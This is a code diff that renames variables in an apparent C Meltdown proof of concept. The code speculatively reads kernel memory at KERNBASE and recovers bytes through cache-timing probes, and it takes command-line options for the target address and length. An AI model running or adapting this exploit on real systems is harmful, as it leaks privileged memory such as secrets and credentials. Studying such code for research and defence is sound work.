@@ -70,10 +70,10 @@ void spec_read(const uint8_t *addr, const uint8_t *probe, unsigned int shift);
 /*
  * Address and length of data to read
  */
-static uint8_t *addr;
-static size_t len;
-#define DEFAULT_ADDR	((uint8_t *)KERNBASE)
-#define DEFAULT_LEN	16
+static uint8_t *atk_addr;
+static size_t atk_len;
+#define DFLT_ATK_ADDR	((uint8_t *)KERNBASE)
+#define DFLT_ATK_LEN	16
 
 /*
  * Probe array
@@ -238,11 +238,11 @@ meltdown(void)
 	int signo;
 
 	sigsegv = signal(SIGSEGV, sighandler);
-	for (i = 0; i < len; ++i) {
+	for (i = 0; i < atk_len; ++i) {
 		line[i % 16] = 0;
 		rflush(probe, PROBE_NLINES, PROBE_LINELEN);
 		if ((signo = sigsetjmp(jmpenv, 1)) == 0)
-			spec_read(&addr[i], probe, PROBE_SHIFT);
+			spec_read(&atk_addr[i], probe, PROBE_SHIFT);
 		for (j = 0; j < PROBE_NLINES; ++j) {
 			uint64_t delta = timed_read(&probe[j * PROBE_LINELEN]);
 			if (delta < threshold) {
@@ -280,29 +280,29 @@ main(int argc, char *argv[])
 	while ((opt = getopt(argc, argv, "a:n:s")) != -1)
 		switch (opt) {
 		case 'a':
-			if (addr != 0)
+			if (atk_addr != 0)
 				usage();
 			umax = strtoull(optarg, &end, 16);
 			if (end == optarg || *end != '\0')
 				errx(1, "invalid address");
-			addr = (uint8_t *)umax;
-			if ((uintmax_t)addr != umax)
+			atk_addr = (uint8_t *)umax;
+			if ((uintmax_t)atk_addr != umax)
 				errx(1, "address is out of range");
 			break;
 		case 'n':
-			if (len != 0)
+			if (atk_len != 0)
 				usage();
 			umax = strtoull(optarg, &end, 0);
 			if (end == optarg || *end != '\0')
 				errx(1, "invalid length");
-			len = umax;
-			if (len == 0 || (uintmax_t)len != umax)
+			atk_len = umax;
+			if (atk_len == 0 || (uintmax_t)atk_len != umax)
 				errx(1, "length is out of range");
 			break;
 		case 's':
-			if (addr != 0)
+			if (atk_addr != 0)
 				usage();
-			addr = selftest;
+			atk_addr = selftest;
 			break;
 		default:
 			usage();
@@ -315,17 +315,17 @@ main(int argc, char *argv[])
 		usage();
 
 	/* default address and length */
-	if (addr == 0)
-		addr = DEFAULT_ADDR;
-	if (len == 0)
-		len = DEFAULT_LEN;
+	if (atk_addr == 0)
+		atk_addr = DFLT_ATK_ADDR;
+	if (atk_len == 0)
+		atk_len = DFLT_ATK_LEN;
 
 	/* generate self-test data if required */
-	if (addr == selftest) {
+	if (atk_addr == selftest) {
 		for (i = 0; i < sizeof selftest; ++i)
 			selftest[i] = '!' + i % ('~' - '!' + 1);
-		if (len > sizeof selftest)
-			len = sizeof selftest;
+		if (atk_len > sizeof selftest)
+			atk_len = sizeof selftest;
 	}
 
 	/* create the probe array and ensure that it is paged in */
